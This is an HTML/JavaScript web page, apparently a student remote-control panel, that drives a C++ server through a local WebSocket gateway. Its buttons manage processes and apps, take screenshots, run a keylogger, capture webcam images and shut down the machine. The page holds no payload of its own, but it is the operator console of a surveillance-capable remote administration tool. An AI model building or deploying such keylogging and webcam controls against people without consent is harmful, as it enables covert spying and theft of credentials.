<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Remote Control Panel (WebSocket)</title>
<style>
body { 
    font-family: Arial, sans-serif; 
    padding: 20px; 
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    margin: 0;
}
.container { 
    max-width: 950px; 
    margin: 0 auto; 
    background: white; 
    padding: 30px; 
    border-radius: 15px; 
    box-shadow: 0 10px 40px rgba(0,0,0,0.2); 
}
h1 { 
    color: #333; 
    text-align: center; 
    margin-bottom: 10px;
    font-size: 28px;
}
.subtitle {
    text-align: center;
    color: #666;
    margin-bottom: 20px;
    font-size: 14px;
}
#status { 
    padding: 15px; 
    margin: 20px 0; 
    border-radius: 8px; 
    text-align: center;
    font-weight: bold;
}
#status.connected { 
    background: #d4edda; 
    color: #155724; 
    border: 1px solid #c3e6cb;
}
#status.disconnected { 
    background: #f8d7da; 
    color: #721c24; 
    border: 1px solid #f5c6cb;
}
#status.connecting { 
    background: #fff3cd; 
    color: #856404; 
    border: 1px solid #ffeaa7;
}
.btn-grid { 
    display: grid; 
    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); 
    gap: 10px; 
    margin: 20px 0; 
}
button { 
    padding: 12px 8px; 
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white; 
    border: none; 
    border-radius: 8px; 
    cursor: pointer; 
    font-size: 13px; 
    font-weight: bold;
    transition: all 0.3s ease;
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
}
button:hover { 
    transform: translateY(-2px);
    box-shadow: 0 6px 12px rgba(0,0,0,0.2);
}
button:active {
    transform: translateY(0);
}
button.danger { 
    background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
}
button.success {
    background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
}
button:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none !important;
}
.section {
    background: #f8f9fa;
    border-radius: 10px;
    padding: 15px;
    margin: 15px 0;
}
.section-title {
    font-weight: bold;
    color: #333;
    margin-bottom: 10px;
    font-size: 14px;
}
.input-group { 
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
    align-items: center;
}
input { 
    padding: 10px; 
    border: 2px solid #e0e0e0;
    border-radius: 8px;
    font-size: 14px;
    flex: 1;
    min-width: 150px;
    transition: border-color 0.3s;
}
input:focus {
    outline: none;
    border-color: #667eea;
}
input[type="number"] {
    width: 80px;
    min-width: 80px;
    flex: 0;
}
#output { 
    background: #1e1e1e; 
    color: #00ff00; 
    padding: 20px; 
    height: 300px; 
    overflow-y: auto; 
    font-family: 'Courier New', monospace; 
    margin-top: 20px; 
    border-radius: 8px;
    font-size: 12px;
    line-height: 1.5;
    box-shadow: inset 0 2px 8px rgba(0,0,0,0.3);
}
#output p {
    margin: 4px 0;
    word-wrap: break-word;
}
.time {
    color: #888;
}
.error {
    color: #ff6b6b !important;
}
.success {
    color: #fcfffc !important;
}
.info {
    color: #4dabf7 !important;
}
#output img, #output video {
    max-width: 100%;
    max-height: 400px;
    border: 2px solid #00ff00;
    margin: 10px 0;
    border-radius: 4px;
}
.media-container {
    text-align: center;
    margin: 10px 0;
}
.loading {
    display: inline-block;
    width: 12px;
    height: 12px;
    border: 2px solid #fff;
    border-radius: 50%;
    border-top-color: transparent;
    animation: spin 0.8s linear infinite;
}
@keyframes spin {
    to { transform: rotate(360deg); }
}
.webcam-controls {
    display: flex;
    align-items: center;
    gap: 10px;
    flex-wrap: wrap;
}
.webcam-controls label {
    font-weight: bold;
    color: #333;
}
</style>
</head>
<body>
<div class="container">
<h1>üñ•Ô∏è Remote Control Panel</h1>
<div class="subtitle">WebSocket Architecture - Gateway + C++ Server (v2.0 with Webcam)</div>

<div id="status" class="disconnected">
    Status: <span id="statusText">Disconnected</span>
</div>

<!-- Main Controls -->
<div class="section">
    <div class="section-title">üìã Main Controls</div>
    <div class="btn-grid">
        <button onclick="sendCmd(1)">üì± List Apps</button>
        <button onclick="sendCmd(4)">‚öôÔ∏è List Process</button>
        <button onclick="sendCmd(6)">üì∏ Screenshot</button>
        <button class="danger" onclick="if(confirm('Shutdown?')) sendCmd(12)">üî¥ Shutdown</button>
        <button class="danger" onclick="if(confirm('Restart?')) sendCmd(13)">üîÑ Restart</button>
    </div>
</div>

<!-- Application Control -->
<div class="section">
    <div class="section-title">üì¶ Application Control</div>
    <div class="input-group">
        <input type="text" id="appName" placeholder="App name (e.g., notepad)">
        <button onclick="stopApp()">‚ùå Stop App</button>
        <button onclick="startApp()">‚ñ∂Ô∏è Start App</button>
    </div>
</div>

<!-- Process Control -->
<div class="section">
    <div class="section-title">üîß Process Control</div>
    <div class="input-group">
        <input type="text" id="pid" placeholder="Process ID (e.g., 1234)">
        <button onclick="killProc()">üíÄ Kill Process</button>
    </div>
</div>

<!-- Keylogger -->
<div class="section">
    <div class="section-title">‚å®Ô∏è Keylogger</div>
    <div class="btn-grid">
        <button class="success" onclick="sendCmd(7)">‚ñ∂Ô∏è Start Keylogger</button>
        <button class="danger" onclick="sendCmd(8)">‚èπÔ∏è Stop Keylogger</button>
        <button onclick="sendCmd(9)">üìã Get Keylog Data</button>
    </div>
</div>

<!-- Webcam Control -->
<div class="section">
    <div class="section-title">üìπ Webcam Control</div>
    <div class="webcam-controls">
        <button class="success" onclick="sendCmd(10)">üü¢ Webcam ON</button>
        <button class="danger" onclick="sendCmd(11)">üî¥ Webcam OFF</button>
        <span style="color: #666;">|</span>
        <button class="success" onclick="captureWebcam()">üì∑ Ch·ª•p ·∫£nh Webcam</button>
    </div>
</div>

<!-- Output -->
<div id="output">
<p class="info">üîå Connecting to WebSocket Gateway...</p>
</div>
</div>

<script>
let ws = null;
let isConnected = false;
let reconnectInterval = null;

// Command codes
const CMD = {
    LIST_APPS: 1,
    STOP_APP: 2,
    START_APP: 3,
    LIST_PROCESS: 4,
    KILL_PROCESS: 5,
    SCREENSHOT: 6,
    KEYLOG_START: 7,
    KEYLOG_STOP: 8,
    KEYLOG_GET: 9,
    WEBCAM_ON: 10,
    WEBCAM_OFF: 11,
    SHUTDOWN: 12,
    RESTART: 13,
    WEBCAM_CAPTURE: 14
};

// K·∫øt n·ªëi WebSocket
function connectWebSocket() {
    try {
        ws = new WebSocket('ws://localhost:8080');
        
        ws.onopen = () => {
            addOutput('‚úÖ Connected to Gateway', 'success');
            updateStatus('connecting', 'Connecting to C++ Server...');
            
            ws.send(JSON.stringify({
                type: 'connect'
            }));
            
            if (reconnectInterval) {
                clearInterval(reconnectInterval);
                reconnectInterval = null;
            }
        };
        
        ws.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                handleServerMessage(data);
            } catch (err) {
                addOutput('‚ùå Error parsing message: ' + err.message, 'error');
            }
        };
        
        ws.onerror = (error) => {
            addOutput('‚ùå WebSocket error', 'error');
            updateStatus('disconnected', 'Connection error');
        };
        
        ws.onclose = () => {
            addOutput('üîå Disconnected from Gateway', 'error');
            updateStatus('disconnected', 'Disconnected');
            isConnected = false;
            
            if (!reconnectInterval) {
                addOutput('üîÑ Will reconnect in 3 seconds...', 'info');
                reconnectInterval = setInterval(() => {
                    addOutput('üîÑ Attempting to reconnect...', 'info');
                    connectWebSocket();
                }, 3000);
            }
        };
    } catch (err) {
        addOutput('‚ùå Failed to create WebSocket: ' + err.message, 'error');
    }
}

// X·ª≠ l√Ω message t·ª´ server
function handleServerMessage(data) {
    if (data.type === 'status') {
        if (data.connected) {
            updateStatus('connected', 'Connected to C++ Server');
            isConnected = true;
            addOutput('‚úÖ ' + data.message, 'success');
        } else {
            updateStatus('disconnected', 'Failed to connect to C++ Server');
            isConnected = false;
            if (data.message) {
                addOutput('‚ùå ' + data.message, 'error');
            }
        }
    } else if (data.type === 'response') {
        if (data.isImage && data.data) {
            // Hi·ªÉn th·ªã ·∫£nh (screenshot ho·∫∑c webcam)
            if (data.command === 14) {
                addOutput('üì∑ Webcam photo received:', 'success');
            } else {
                addOutput('üì∏ Screenshot received:', 'success');
            }
            addImageOutput('data:image/bmp;base64,' + data.data);
        } else if (data.isVideo && data.data) {
            // Hi·ªÉn th·ªã video
            addOutput('üé¨ Video received successfully!', 'success');
            addVideoOutput('data:video/avi;base64,' + data.data);
        } else if (data.data && data.data.trim && data.data.trim() !== '') {
            // Hi·ªÉn th·ªã text response
            const lines = data.data.split('\n');
            lines.forEach(line => {
                if (line.trim()) {
                    addOutput(line, 'info');
                }
            });
        }
        // Kh√¥ng l√†m g√¨ n·∫øu data r·ªóng ho·∫∑c undefined
    } else if (data.type === 'error') {
        if (data.message) {
            addOutput('‚ùå ' + data.message, 'error');
        }
    }
}

// C·∫≠p nh·∫≠t tr·∫°ng th√°i
function updateStatus(status, text) {
    const statusDiv = document.getElementById('status');
    const statusText = document.getElementById('statusText');
    
    statusDiv.className = status;
    statusText.textContent = text;
}

// Th√™m output text
function addOutput(text, type = 'info') {
    const output = document.getElementById('output');
    const p = document.createElement('p');
    const time = new Date().toLocaleTimeString();
    
    p.className = type;
    p.innerHTML = '<span class="time">[' + time + ']</span> ' + escapeHtml(text);
    
    output.appendChild(p);
    output.scrollTop = output.scrollHeight;
}

// Th√™m output image
function addImageOutput(imgSrc) {
    const output = document.getElementById('output');
    const container = document.createElement('div');
    container.className = 'media-container';
    
    const img = document.createElement('img');
    img.src = imgSrc;
    img.alt = 'Screenshot';
    
    container.appendChild(img);
    output.appendChild(container);
    output.scrollTop = output.scrollHeight;
}

// Th√™m output video
function addVideoOutput(videoSrc) {
    const output = document.getElementById('output');
    const container = document.createElement('div');
    container.className = 'media-container';
    
    const video = document.createElement('video');
    video.src = videoSrc;
    video.controls = true;
    video.autoplay = false;
    video.style.maxWidth = '100%';
    
    // Th√™m n√∫t download
    const downloadBtn = document.createElement('a');
    downloadBtn.href = videoSrc;
    downloadBtn.download = 'webcam_capture_' + Date.now() + '.avi';
    downloadBtn.innerHTML = 'üíæ Download Video';
    downloadBtn.style.cssText = 'display: block; margin-top: 10px; color: #00ff00; text-decoration: underline;';
    
    container.appendChild(video);
    container.appendChild(downloadBtn);
    output.appendChild(container);
    output.scrollTop = output.scrollHeight;
}

// Escape HTML ƒë·ªÉ tr√°nh XSS
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// G·ª≠i command
function sendCmd(cmd, data) {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        addOutput('‚ùå Not connected to Gateway!', 'error');
        return;
    }
    
    if (!isConnected) {
        addOutput('‚ùå Gateway not connected to C++ Server!', 'error');
        return;
    }
    
    data = data || '';
    
    // Hi·ªÉn th·ªã th√¥ng b√°o ph√π h·ª£p v·ªõi t·ª´ng command
    const cmdNames = {
        1: 'List Apps',
        2: 'Stop App',
        3: 'Start App',
        4: 'List Processes',
        5: 'Kill Process',
        6: 'Screenshot',
        7: 'Start Keylogger',
        8: 'Stop Keylogger',
        9: 'Get Keylog Data',
        10: 'Webcam ON',
        11: 'Webcam OFF',
        12: 'Shutdown',
        13: 'Restart',
        14: 'Webcam Capture'
    };
    
    addOutput('üì§ Sending: ' + (cmdNames[cmd] || 'Command ' + cmd) + (data ? ' (' + data + ')' : ''), 'info');
    
    ws.send(JSON.stringify({
        type: 'command',
        cmd: cmd,
        data: data
    }));
}

// Stop app
function stopApp() {
    const name = document.getElementById('appName').value.trim();
    if (name) {
        sendCmd(CMD.STOP_APP, name);
    } else {
        addOutput('‚ö†Ô∏è Please enter application name', 'error');
    }
}

// Start app
function startApp() {
    const name = document.getElementById('appName').value.trim();
    if (name) {
        sendCmd(CMD.START_APP, name);
    } else {
        addOutput('‚ö†Ô∏è Please enter application path', 'error');
    }
}

// Kill process
function killProc() {
    const pid = document.getElementById('pid').value.trim();
    if (pid) {
        sendCmd(CMD.KILL_PROCESS, pid);
    } else {
        addOutput('‚ö†Ô∏è Please enter process ID', 'error');
    }
}

// Capture webcam
function captureWebcam() {
    addOutput('üì∑ Capturing webcam photo... Please wait.', 'info');
    sendCmd(CMD.WEBCAM_CAPTURE, '1');  // Ch·ª•p 1 ·∫£nh
}

// Start webcam
function startRecording() {
    addOutput('üé• Starting webcam recording...', 'info');
    sendCmd(CMD.WEBCAM_ON); // G·ª≠i l·ªánh 10
}

// Stop webcam
function stopRecording() {
    addOutput('‚èπÔ∏è Stopping recording... Waiting for video file...', 'info');
    sendCmd(CMD.WEBCAM_OFF); // G·ª≠i l·ªánh 11
}

// Ki·ªÉm tra tr·∫°ng th√°i ƒë·ªãnh k·ª≥
setInterval(() => {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'status_check'
        }));
    }
}, 5000);

// K·∫øt n·ªëi khi trang load
window.onload = () => {
    connectWebSocket();
};

// ƒê√≥ng k·∫øt n·ªëi khi t·∫Øt trang
window.onbeforeunload = () => {
    if (ws) {
        ws.close();
    }
};
</script>
</body>
</html>
